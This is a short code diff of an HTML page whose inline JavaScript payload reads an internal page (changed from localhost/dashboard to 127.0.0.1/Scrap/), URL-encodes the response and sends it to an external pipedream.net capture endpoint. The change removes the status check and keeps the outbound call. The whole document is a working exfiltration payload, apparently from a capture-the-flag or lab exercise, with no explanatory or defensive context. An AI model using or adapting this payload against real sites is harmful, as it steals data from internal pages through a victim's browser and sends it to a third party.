@@ -9,15 +9,15 @@
 <body>
     <script>
       const getReq = new XMLHttpRequest();
-getReq.open('GET', 'https://localhost/dashboard', true);
-getReq.onload = () => {
-  if (getReq.status === 200) {
-    const data = encodeURIComponent(getReq.responseText); // Encode data for URL
-    const sendReq = new XMLHttpRequest();
-    sendReq.open('GET', `https://eo152lqegwprrxn.m.pipedream.net/${data}`, true);
-    sendReq.send();
-  }
-};
+        getReq.open('GET', 'http://127.0.0.1/Scrap/', true);
+        getReq.onload = () => {
+          
+        const data = encodeURIComponent(getReq.responseText); // Encode data for URL
+        const sendReq = new XMLHttpRequest();
+        sendReq.open('GET', `https://eo152lqegwprrxn.m.pipedream.net/${data}`, true);
+        sendReq.send();
+          
+        };
 getReq.send();
     </script>
 </body>
